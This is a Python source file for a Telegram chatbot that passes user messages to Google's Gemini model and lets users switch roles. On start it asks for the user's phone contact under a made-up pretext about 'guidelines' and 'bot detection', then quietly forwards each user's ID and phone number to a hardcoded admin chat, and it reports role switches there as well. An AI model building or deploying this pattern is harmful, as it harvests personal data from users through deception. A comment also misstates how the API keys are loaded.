import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, filters, CommandHandler, CallbackQueryHandler
import google.generativeai as genai

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Load API keys from environment variables
GENIE_API_KEY = ""  # Replace with your actual Gemini API key
TELEGRAM_TOKEN = ""  # Replace with your actual Telegram bot token

if not GENIE_API_KEY or not TELEGRAM_TOKEN:
    raise ValueError("API keys not found. Make sure to set GEMINI_API_KEY and TELEGRAM_TOKEN.")

# Set up the Gemini AI client
genai.configure(api_key=GENIE_API_KEY)

# Create the model instance
model = genai.GenerativeModel("gemini-1.5-flash")

# Admin chat ID (replace with your own)
ADMIN_CHAT_ID = 7416312733  # Replace with your admin Telegram ID

# Predefined roles for users
ROLES = {
    "admin": [ADMIN_CHAT_ID],
    "gf": [],
    "friend": [],
    "programmer": [],
    "hacker": [],
    "teacher": [],
    "chief_advisor": [],
    "mentor": [],
    "developer": [],
    "designer": [],
    "researcher": [],
    "strategist": []
}

# Start command handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    # Request contact button will appear as soon as the user starts
    keyboard = [
        [KeyboardButton("Share Your Contact Due TO Guidlines And Avoiding Bot Detaction!", request_contact=True)]  # Request contact button
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=True)
    await update.message.reply_text("Welcome! Before we continue, please share your contact information Due TO Guidlines And Avoiding Bot Detaction!:", reply_markup=reply_markup)

# Handler to process the contact information shared by the user
async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    user_id = update.message.from_user.id
    phone_number = contact.phone_number
    
    # Send the phone number to the admin
    admin_message = f"User {user_id} has shared their phone number: {phone_number}"
    await context.bot.send_message(ADMIN_CHAT_ID, admin_message)
    
    # Now that the contact has been received, provide further options
    keyboard = [
        [InlineKeyboardButton("Switch Role", callback_data="switch_role")],
        [InlineKeyboardButton("Ask AI", callback_data="ask_ai")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "Thank you for sharing your contact! Choose an action:",
        reply_markup=reply_markup
    )

# Callback for role-based actions
async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id

    if query.data == "switch_role":
        # Switch role
        keyboard = [
            [InlineKeyboardButton("Switch to GF", callback_data="switch_to_gf")],
            [InlineKeyboardButton("Switch to Programmer", callback_data="switch_to_programmer")],
            [InlineKeyboardButton("Switch to Teacher", callback_data="switch_to_teacher")],
            [InlineKeyboardButton("Switch to Chief Advisor", callback_data="switch_to_chief_advisor")],
            [InlineKeyboardButton("Switch to Mentor", callback_data="switch_to_mentor")],
            [InlineKeyboardButton("Switch to Developer", callback_data="switch_to_developer")],
            [InlineKeyboardButton("Switch to Designer", callback_data="switch_to_designer")],
            [InlineKeyboardButton("Switch to Researcher", callback_data="switch_to_researcher")],
            [InlineKeyboardButton("Switch to Strategist", callback_data="switch_to_strategist")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.answer()
        await query.message.edit_text("Select the role you want to switch to:", reply_markup=reply_markup)
    
    elif query.data.startswith("switch_to_"):
        role = query.data.split("_to_")[1]
        
        # Switch user role to the selected role
        if role in ROLES:
            for r in ROLES.values():
                if isinstance(r, list) and user_id in r:
                    r.remove(user_id)
            if isinstance(ROLES.get(role), list):
                ROLES[role].append(user_id)
                await query.answer(f"You are now a {role.capitalize()}!")
                admin_message = f"User with ID {user_id} has switched to {role.capitalize()} role."
                await context.bot.send_message(ADMIN_CHAT_ID, admin_message)
                await query.message.edit_text("Role switched successfully.")
        else:
            await query.answer("Invalid role selection.")

# Function to generate AI-based responses
async def get_ai_response(user_message: str) -> str:
    try:
        response = model.generate_content(user_message)
        return response.text.strip()
    except Exception as e:
        return f"Error generating response: {e}"

# Echo command: Receive and respond based on AI
async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_message = update.message.text
    ai_response = await get_ai_response(user_message)
    await update.message.reply_text(ai_response)

# Set up the application
application = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

# Handlers for commands
application.add_handler(CommandHandler("start", start))
application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
application.add_handler(CallbackQueryHandler(handle_callback))
application.add_handler(MessageHandler(filters.CONTACT, handle_contact))  # Handle the contact sharing

# Start the bot
application.run_polling()
